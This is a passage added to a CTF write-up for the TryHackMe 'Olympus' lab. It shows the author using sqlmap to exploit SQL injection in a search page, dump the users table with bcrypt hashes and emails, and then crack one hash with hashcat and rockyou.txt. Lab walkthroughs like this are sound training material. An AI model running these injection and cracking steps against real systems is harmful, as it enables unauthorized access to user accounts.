@@ -256,3 +256,98 @@ Table: flag
 
 [*] ending @ 21:23:00 /2025-06-29/
 ```
+
+
+
+Now its time to check out the users.
+
+
+```bash
+❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" --dbs --random-agent -v 0 -D olympus -T users --columns --dump 
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.9.4#stable}
+|_ -| . [']     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+available databases [6]:
+[*] information_schema
+[*] mysql
+[*] olympus
+[*] performance_schema
+[*] phpmyadmin
+[*] sys
+
+Database: olympus
+Table: users
+[9 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| randsalt       | varchar(255) |
+| user_email     | varchar(255) |
+| user_firstname | varchar(255) |
+| user_id        | int          |
+| user_image     | text         |
+| user_lastname  | varchar(255) |
+| user_name      | varchar(255) |
+| user_password  | varchar(255) |
+| user_role      | varchar(255) |
++----------------+--------------+
+
+Database: olympus
+Table: users
+[3 entries]
++---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
+| user_id | randsalt | user_name  | user_role | user_email             | user_image | user_lastname | user_password                                                | user_firstname |
++---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
+| 3       | <blank>  | prometheus | User      | prometheus@olympus.thm | <blank>    | <blank>       | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | prometheus     |
+| 6       | dgas     | root       | Admin     | root@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root           |
+| 7       | dgas     | zeus       | User      | zeus@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus           |
++---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
+
+
+[*] ending @ 21:26:31 /2025-06-29/
+```
+
+
+As you can see there root and zeus has chat.olympus domains. We probably my wordlist little small for the job beacause when i tried to fuzz the subdomains i didn't find this one. Whatever lets go to the subdomain.
+
+Before this add the subdomain to the /etc/hosts.
+
+
+And we got login screen.
+
+![Desktop View](/assets/img/2025-06-29-TryHackMe-Olympus/photo3.png){: width="972" height="589" }
+
+
+
+Maybe we can try cracking bcrypt'ed passwords.
+
+```bash
+❯ hashcat -m 3200 -a 0 hash/hash.txt rockyou.txt 
+hashcat (v6.2.6) starting
+
+Dictionary cache built:
+* Filename..: rockyou.txt
+* Passwords.: 14344391
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+* Runtime...: 1 sec
+
+$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C:*********
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2...Dvnj3C
+```
+
+
+And prometheus one worked just fine.
+
+I tried cracking admin too but I can't cracked it.
+
+
+![Desktop View](/assets/img/2025-06-29-TryHackMe-Olympus/photo4.png){: width="972" height="589" }
